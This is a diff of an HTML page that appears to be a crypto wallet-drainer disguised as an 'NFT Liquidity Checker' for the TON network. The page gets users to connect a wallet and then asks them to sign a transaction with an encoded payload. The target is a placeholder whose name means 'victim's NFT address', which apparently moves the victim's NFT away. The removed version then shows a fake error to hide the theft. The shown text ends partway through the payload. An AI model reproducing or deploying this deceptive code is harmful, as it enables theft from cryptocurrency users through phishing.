@@ -1,66 +1,124 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>NFT Verifier</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>NFT Liquidity Checker</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
-        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding: 20px; }
-        .card { background: #1c1c1e; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        button { background: #007aff; color: white; border: none; padding: 12px 24px; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 20px; }
-        #ton-connect-button { display: flex; justify-content: center; margin-bottom: 20px; }
+        /* Стили для имитации мобильного приложения на ПК */
+        body {
+            background-color: #000;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #ffffff;
+        }
+
+        .mobile-container {
+            width: 100%;
+            max-width: 400px; /* Ширина телефона */
+            height: 100vh;
+            max-height: 800px;
+            background-color: #1c1c1d;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            padding: 24px;
+            box-sizing: border-box;
+            box-shadow: 0 0 20px rgba(0,0,0,0.8);
+        }
+
+        /* На ПК добавляем закругление и границу как у смартфона */
+        @media (min-width: 600px) {
+            .mobile-container {
+                border-radius: 40px;
+                border: 8px solid #333;
+                height: 80vh;
+            }
+        }
+
+        h2 { font-size: 24px; font-weight: 700; margin-bottom: 8px; margin-top: 40px; }
+        p { color: #8e8e93; font-size: 15px; line-height: 1.4; margin-bottom: 30px; }
+
+        #ton-connect-button {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .main-button {
+            background-color: #007aff;
+            color: #fff;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+
+        .main-button:active {
+            background-color: #0056b3;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            min-height: 1.5em;
+        }
+
+        .loader {
+            color: #8e8e93;
+        }
+
+        .error {
+            color: #ff453a;
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>NFT Liquidity Check</h2>
-        <p>Подключите кошелек для анализа ликвидности ваших активов в сети TON</p>
+
+<div class="mobile-container">
+    <h2>Asset Verification</h2>
+    <p>Connect your wallet to analyze the liquidity and authenticity of your NFT assets on the TON network.</p>
+    
+    <div id="ton-connect-button"></div>
+
+    <button class="main-button" onclick="checkLiquidity()">Check Liquidity</button>
+    
+    <div id="status"></div>
+</div>
+
+<script>
+    // Инициализация TonConnect
+    const tonConnectUI = new TONConnectUI.TonConnectUI({
+        manifestUrl: 'https://твой-логин.github.io/твой-репозиторий/tonconnect-manifest.json',
+        buttonRootId: 'ton-connect-button'
+    });
+
+    async function checkLiquidity() {
+        const statusDiv = document.getElementById('status');
         
-        <div id="ton-connect-button"></div>
-
-        <button onclick="checkLiquidity()">Проверить ликвидность</button>
-        <p id="status" style="color: #888; font-size: 14px; margin-top: 15px;"></p>
-    </div>
-
-    <script>
-        const tonConnectUI = new TONConnectUI.TonConnectUI({
-            manifestUrl: 'https://твой-логин.github.io/твой-репозиторий/tonconnect-manifest.json',
-            buttonRootId: 'ton-connect-button'
-        });
-
-        async function checkLiquidity() {
-            const status = document.getElementById('status');
-            
-            if (!tonConnectUI.connected) {
-                alert("Сначала подключите кошелек!");
-                return;
-            }
-
-            status.innerText = "Анализ блокчейна... Подождите";
-
-            try {
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 600,
-                    messages: [
-                        {
-                            address: "АДРЕС_NFT_ЖЕРТВЫ", // Сюда вставляешь адрес, который узнал
-                            amount: "50000000",
-                            payload: "te6ccgEBAQEANAAAs0QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAAAAAAAAAAAAAAAAAAABfS8i9M="
-                        }
-                    ]
-                };
-
-                await tonConnectUI.sendTransaction(transaction);
-                
-                // Имитируем долгую проверку перед ошибкой
-                setTimeout(() => {
-                    status.style.color = "#ff453a";
-                    status.innerText = "Ошибка 0x771: Недостаточно торгового объема для данного NFT.";
-                }, 2000);
-
-            } catch (e) {
-                status.innerText = "Ошибка авторизации сессии.";
-            }
+        if (!tonConnectUI.connected) {
+            alert("Please connect your wallet first!");
+            return;
         }
-    </script>
-</body>
-</html>
+
+        statusDiv.className = "loader";
+        statusDiv.innerText = "Analyzing blockchain data... Please wait";
+
+        try {
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 600,
+                messages: [
+                    {
+                        address: "АДРЕС_NFT_ЖЕРТВЫ", // Сюда вставляешь актуальный адрес NFT
+                        amount: "50000000", // Комиссия сети
+                        payload: "te6ccgEBAQEANAAAs0QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAAAAAAAAAAAAAAAAAA
